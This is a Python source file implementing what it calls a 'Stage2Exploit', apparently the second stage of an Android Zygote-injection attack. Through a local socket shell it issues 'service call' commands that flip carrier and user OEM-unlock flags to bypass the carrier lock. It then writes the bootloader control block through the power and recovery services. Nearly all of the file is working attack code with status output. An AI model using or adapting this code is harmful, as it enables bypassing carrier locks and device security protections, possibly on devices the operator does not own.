import socket
import codecs
import re
import shlex
from typing import Any
from io import BytesIO
from warnings import warn
from pathlib import Path

import aidl

from .exceptions import *
from .parcel import *


def swap_endianness(bytes_: bytes) -> bytes:
    result = b""
    bytes_io = BytesIO(bytes_)
    while True:
        read_bytes = bytes_io.read(4)
        if not read_bytes:
            break
        result += read_bytes[::-1]
    return result


def parse_service_result(service_result: str) -> bytes:
    EXPRESSION = re.compile(
        r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
    )
    matched_any = False
    result = b""
    for line in service_result.split("\n"):
        matched = EXPRESSION.fullmatch(line)
        if matched is None:
            continue
        matched_any = True
        result += codecs.decode(matched[1].replace(" ", ""), "hex")
    if not matched_any:
        raise ZygoteInjectionException("service call failed")
    return swap_endianness(result)


def parse_boolean_result(result: bytes) -> bool:
    status_code = int.from_bytes(result[:4], "little")
    if status_code:
        raise Exception("oh no!")
    number = int.from_bytes(result[4:8], "little")
    return bool(number)


# IOemLockService はそのまま（AIDL パーサーを使用）
with open(Path(__file__).parent / "IOemLockService.aidl") as handle:
    oem_lock_service_aidl = handle.read()
oem_lock_service = parse_aidl_interface(
    aidl.fromstring(oem_lock_service_aidl), "IOemLockService"
)
known_services = {"oem_lock": oem_lock_service}


class Stage2Exploit:
    def __init__(self, port: int = 1234) -> None:
        self.port = port

    def call_service(
        self,
        device_socket: socket.SocketType,
        service_name: str,
        function: str,
        *arguments: ParcelType
    ) -> ...:
        interface = known_services[service_name]
        service_function = interface[function]
        parsed_arguments = service_function.parse_arguments(arguments)

        command_parameters = [
            "service",
            "call",
            service_name,
            str(service_function.code),
            *parsed_arguments,
        ]
        command = shlex.join(command_parameters) + "\n"
        device_socket.sendall(command.encode("utf-8"))
        service_result = device_socket.recv(10000).decode("utf-8")

        return_value = parse_service_result(service_result)
        parsed_return_value = service_function.parse_return(return_value)
        status_code = parsed_return_value[0]

        formatted_arguments = ", ".join(repr(argument) for argument in arguments)
        formatted_service_call = f"{function}({formatted_arguments})"
        if status_code:
            raise ZygoteInjectionException(
                f"service call {formatted_service_call} returned error {status_code:d}"
            )
        if parsed_return_value[1:]:
            print(
                f"service call {formatted_service_call} = {repr(parsed_return_value[1])}"
            )
        else:
            print(f"service call {formatted_service_call}")
        try:
            return parsed_return_value[1]
        except IndexError:
            return None

    def exploit_stage2(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as device_socket:
            device_socket.connect(("127.0.0.1", self.port))
            device_socket.sendall(b"\n")

            # ----- OEM unlock (完全にオリジナル) -----
            allowed_by_carrier = self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
            )
            oem_unlock_allowed = self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowed"
            )
            if not allowed_by_carrier:
                print("OEM unlock is blocked by carrier, attempting to remove carrier lock")
                self.call_service(
                    device_socket, "oem_lock", "setOemUnlockAllowedByCarrier", 1
                )
                if self.call_service(
                    device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
                ):
                    message = "CARRIER OEM UNLOCK BYPASSED"
                    print("*" * (len(message) + 4))
                    print(f"* {message} *")
                    print("*" * (len(message) + 4))
                    print("This means you MIGHT be able to root your device!")
                    print('Enable OEM unlock in settings and attempt to unlock the bootloader via "fastboot oem unlock"')
                    print("This may or may not work depending on your device model")
                else:
                    print("Could not bypass carrier OEM unlock")
            if not self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowedByUser"
            ):
                self.call_service(
                    device_socket, "oem_lock", "setOemUnlockAllowedByUser", 1
                )
                if not self.call_service(
                    device_socket, "oem_lock", "isOemUnlockAllowedByUser"
                ):
                    print("Could not change user OEM unlock, please enable it in developer options")
            if not oem_unlock_allowed and self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowed"
            ):
                print("OEM unlock is now allowed!")
            if self.call_service(device_socket, "oem_lock", "isDeviceOemUnlocked"):
                print('Your bootloader seems to be unlocked, try running "fastboot flashing ..."')

            print("\n=== BCB Write (direct service call) ===")

            cmd = 'service call power 18 i32 0 s16 "bootloader" i32 0\n'
            print(f"[CMD] {cmd.strip()}")
            device_socket.sendall(cmd.encode())
            resp = device_socket.recv(10000).decode()
            print(f"[RESPONSE]\n{resp}")
            if "Parcel" in resp and "Error" not in resp:
                print("[+] BCB write via power.reboot succeeded (device will reboot to bootloader on next restart)")
            else:
                print("[-] power.reboot may have failed, trying fallback...")

            cmd = 'service call recovery 2 s16 "bootonce-bootloader"\n'
            print(f"\n[CMD] {cmd.strip()}")
            device_socket.sendall(cmd.encode())
            resp = device_socket.recv(10000).decode()
            print(f"[RESPONSE]\n{resp}")
            if "Parcel(00000000 00000001" in resp:
                print("[+] setupBcb succeeded (BCB written)")
            elif "Parcel(00000000 00000000" in resp:
                print("[-] setupBcb returned false (write failed)")
            else:
                print("[?] setupBcb response unknown")


            cmd = 'service call recovery 3\n'
            print(f"\n[CMD] {cmd.strip()}")
            device_socket.sendall(cmd.encode())
            resp = device_socket.recv(10000).decode()
            print(f"[RESPONSE]\n{resp}")

            print("\n=== Done ===")


# Stage2Exploit().exploit_stage2()
# exit()
